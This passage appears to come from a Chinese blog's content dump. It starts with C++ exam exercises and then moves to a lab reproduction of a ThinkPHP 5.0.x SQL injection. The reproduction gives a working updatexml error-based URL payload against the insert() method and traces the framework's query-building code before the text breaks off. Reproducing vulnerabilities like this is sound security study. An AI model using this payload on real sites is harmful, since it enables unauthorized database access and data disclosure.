class="built_in">Complex</span>(<span class="type">double</span> r, <span class="type">double</span> i) :<span class="built_in">real</span>(r), <span class="built_in">imag</span>(i) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">Complex <span class="keyword">operator</span> + (Complex &amp;c);</span><br><span class="line">Complex <span class="keyword">operator</span> + (<span class="type">int</span> &amp;i); </span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> + (<span class="type">int</span> &amp;, Complex &amp;); <span class="comment">// i + c</span></span><br><span class="line"><span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;out, <span class="type">const</span> Complex &amp;c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">double</span> real; <span class="comment">// 复数实部</span></span><br><span class="line"><span class="type">double</span> imag; <span class="comment">// 复数虚部</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> + (Complex &amp;c)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Complex operator + (Complex &amp;c)&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Complex</span>(real + c.real, imag + c.imag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> + (<span class="type">int</span> &amp;i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Complex operator + (int &amp;i)&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Complex</span>(real + i, imag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex <span class="keyword">operator</span> + (<span class="type">int</span> &amp;i, Complex &amp;c)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Complex operator + (int &amp;i, Complex &amp;c)&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Complex</span>(i + c.real, c.imag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Complex::display</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; real &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; imag &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt;(ostream &amp;out, <span class="type">const</span> Complex &amp;c) &#123;</span><br><span class="line">out &lt;&lt; c.real &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c.imag &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Complex <span class="title">c1</span><span class="params">(<span class="number">5</span>, <span class="number">-2</span>)</span>, <span class="title">c2</span><span class="params">(<span class="number">-4</span>, <span class="number">3</span>)</span>, c3</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">6</span>;</span><br><span class="line">c3 = c1 + i;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;c1 + i = &quot;</span>;</span><br><span class="line">c3.<span class="built_in">display</span>();</span><br><span class="line">c3 = i + c1;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;i + c1 = &quot;</span>;</span><br><span class="line">c3.<span class="built_in">display</span>();</span><br><span class="line">c3 = c1 + c2;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot; c1 + c2 = &quot;</span>;</span><br><span class="line">cout &lt;&lt; c3;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>例题8-4 重写<code>&lt;&lt;</code>和<code>+</code> <code>前++</code>和<code>后++</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Counter</span>() :<span class="built_in">count</span>(<span class="number">0</span>) &#123;  &#125;</span><br><span class="line"><span class="built_in">Counter</span>(<span class="type">int</span> num):<span class="built_in">count</span>(num) &#123;  &#125;</span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream &amp;out, <span class="type">const</span> Counter &amp;c);</span><br><span class="line">Counter <span class="keyword">operator</span> +(<span class="type">int</span> num);</span><br><span class="line">Counter <span class="keyword">operator</span> ++();<span class="comment">//前置++</span></span><br><span class="line">Counter <span class="keyword">operator</span> ++(<span class="type">int</span>); <span class="comment">//后置++</span></span><br><span class="line">&#125;;</span><br><span class="line">Counter Counter::<span class="keyword">operator</span>+(<span class="type">int</span> num)&#123;</span><br><span class="line">count += num;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream &amp;out, <span class="type">const</span> Counter &amp;c) &#123;</span><br><span class="line">out &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; c.count &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line">Counter Counter::<span class="keyword">operator</span>++() &#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">Counter Counter::<span class="keyword">operator</span>++(<span class="type">int</span>)&#123;</span><br><span class="line">Counter old = *<span class="keyword">this</span>;</span><br><span class="line">++(*<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Counter <span class="title">c1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">c1 = c1 + <span class="number">5</span>;</span><br><span class="line">cout &lt;&lt; c1 &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; c1++ &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; ++c1 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="2010"><a href="#2010" class="headerlink" title="2010"></a>2010</h1><h2 id="1-输入n个十进制数转换成二进制写到文件"><a href="#1-输入n个十进制数转换成二进制写到文件" class="headerlink" title="1. 输入n个十进制数转换成二进制写到文件"></a>1. 输入n个十进制数转换成二进制写到文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">toBinary</span><span class="params">(<span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">if</span> (d == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (d) &#123;</span><br><span class="line">s += (d % <span class="number">2</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;</span><br><span class="line">d /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">os</span><span class="params">(<span class="string">&quot;C:/Users/lenovo/Desktop/te.txt&quot;</span>, ios::binary | ios::out)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!os) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;File cannot be opened!&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Enter the number!&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">string s = <span class="built_in">toBinary</span>(n);</span><br><span class="line">os &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">&#125; <span class="keyword">while</span> (n != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-写两个模板函数-插入排序算法的迭代和递归实现"><a href="#2-写两个模板函数-插入排序算法的迭代和递归实现" class="headerlink" title="2. 写两个模板函数:插入排序算法的迭代和递归实现"></a>2. 写两个模板函数:插入排序算法的迭代和递归实现</h2><ol><li>迭代</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">(T a[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertSort</span><span class="params">(T arr[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>,j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> minVal_index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i; i &lt; n; i++) &#123;</span><br><span class="line">minVal_index = i;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[minVal_index] &gt; arr[j])</span><br><span class="line">minVal_index = j;</span><br><span class="line">&#125;</span><br><span class="line">j = minVal_index;</span><br><span class="line">T temp = arr[minVal_index];</span><br><span class="line"><span class="keyword">while</span>(j &gt; i) &#123;</span><br><span class="line">arr[j] = arr[j<span class="number">-1</span>];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = temp;</span><br><span class="line"><span class="built_in">output</span>(arr);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="built_in">insertSort</span>(a, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-字符串解析"><a href="#3-字符串解析" class="headerlink" title="3. 字符串解析"></a>3. 字符串解析</h2><ul><li>文件内有<code>(010)(150123456789)|123|(430070)</code></li><li>按照以下格式输出”区号|电话号码|城市编号|邮编”</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//(010)(150123456789)|123|(430070)</span></span><br><span class="line"><span class="function">ifstream <span class="title">in</span><span class="params">(<span class="string">&quot;C:/Users/lenovo/Desktop/te.txt&quot;</span>, ios::binary | ios::in)</span></span>;</span><br><span class="line">string origin_data;</span><br><span class="line"><span class="built_in">getline</span>(in, origin_data);     <span class="comment">//读取文件</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; <span class="string">&quot;区号&quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; <span class="string">&quot;电话号码&quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; <span class="string">&quot;城市编号&quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; <span class="string">&quot;邮编&quot;</span> &lt;&lt; endl;</span><br><span class="line">string id = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> a : origin_data) &#123;</span><br><span class="line"><span class="keyword">if</span> (a != <span class="string">&#x27;(&#x27;</span> &amp;&amp; a != <span class="string">&#x27;)&#x27;</span> &amp;&amp; a != <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">id+=a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (id.<span class="built_in">length</span>()) &#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; id;</span><br><span class="line">id.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.0.X框架SQL注入漏洞</title>
      <link href="/2023/03/21/TP5sql/"/>
      <url>/2023/03/21/TP5sql/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP5-0-X框架SQL注入漏洞"><a href="#ThinkPHP5-0-X框架SQL注入漏洞" class="headerlink" title="ThinkPHP5.0.X框架SQL注入漏洞"></a>ThinkPHP5.0.X框架SQL注入漏洞</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>自己还没有用composer,所以先用了phpstudy简答的搭建了一下环境</li></ol><h3 id="1-mysql创建数据"><a href="#1-mysql创建数据" class="headerlink" title="1. mysql创建数据"></a>1. mysql创建数据</h3><ol><li><p><code>create database thinkphp</code> 创建一个名为thinkphp的数据库</p></li><li><p><code>create table users(id int auto_increment primary key,username varchar(20),password varchar(30));</code>创建一个users表里面的段名为id,username,password,其中id设置为主键</p></li><li><p>接着插入数据<code>Insert into users(id,username,password) values(1,&#39;xbx_0d&#39;,&#39;tobebetter&#39;);</code></p></li></ol><h3 id="2-ThinkPHP基础配置"><a href="#2-ThinkPHP基础配置" class="headerlink" title="2. ThinkPHP基础配置"></a>2. ThinkPHP基础配置</h3><p>没学过ThinkPHP的同学可以参考上面提供的第一个资料</p><p> 1.开启debug模式</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311762253-4de65fb5-83b3-428a-9bdf-b7e34002cb26.png" alt="img"></p><p> 2.配置database文件</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311910223-af6050fa-8125-4b81-97a4-32ad5a581558.png" alt="img"></p><p> 3.修改application\index\controller\index.php文件<img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312397619-1b99b2d1-0902-43fb-a04e-9253055dad9f.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;get.name/a&quot;</span>);</span><br><span class="line">        <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&quot;users&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&quot;id&quot;</span>=&gt;<span class="number">1</span>])-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$name</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ThinkPHP SQL Test.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 4.尝试触发漏洞</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312581283-6da25b8e-a05b-4d39-a8d0-f14f7a0aadc1.png" alt="img">payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">public</span>/index.php/index/index/index?name[<span class="number">0</span>]=inc&amp;name[<span class="number">1</span>]=<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;name[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol><li><p>因为是复现所以明确知道的是insert函数存在漏洞,接下来是分析</p></li><li><p>首先看自己定义的控制器的index函数</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122140339648.png" alt="image-20211122140339648"></p></li><li><p>直接转到insert函数的定义在&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Query.php文件下,这里自己尝试分析了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span>, <span class="variable">$getLastInsID</span> = <span class="literal">false</span>, <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseExpress</span>(); <span class="comment"># 分析我们写入的表达式是用来查询还是写入</span></span><br><span class="line">        <span class="variable">$data</span>    = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$data</span>);  <span class="comment"># 合并数组,$data是我们自己传入执行语句</span></span><br><span class="line">        <span class="comment">// 生成SQL语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;builder-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$data</span>, <span class="variable">$options</span>, <span class="variable">$replace</span>);</span><br><span class="line">        <span class="comment">//运行到这里的时候sql的值为&quot;INSERT INTO `users` (`username`) VALUES (:data__username) &quot;</span></span><br><span class="line">        <span class="comment">// 获取参数绑定</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBind</span>();</span><br><span class="line">    <span class="comment">//这里的参数绑定就是绑定:data_username</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) &#123;  <span class="comment">#这里$options[&#x27;fetch_sql&#x27;]值为false跳过</span></span><br><span class="line">            <span class="comment">// 获取实际执行的SQL语句</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;connection-&gt;<span class="title function_ invoke__">getRealSql</span>(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行操作</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="number">0</span> === <span class="variable">$sql</span> ? <span class="number">0</span> : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, <span class="variable">$bind</span>);<span class="comment">#这里就是如果sql语句不为空就执行绑定参数的sql语句</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$sequence</span>  = <span class="variable">$sequence</span> ?: (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable">$lastInsId</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getLastInsID</span>(<span class="variable">$sequence</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$lastInsId</span>) &#123;</span><br><span class="line">                <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>(<span class="variable">$options</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$pk</span>)) &#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="variable">$pk</span>] = <span class="variable">$lastInsId</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;after_insert&#x27;</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$getLastInsID</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$lastInsId</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>接着我们跟进到<code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code>的insert()函数</p><p>这里构造了我们最后要执行的sql语句,所以漏洞一般产生在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$options</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析并处理数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseData</span>(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$fields</span> = <span class="title function_ 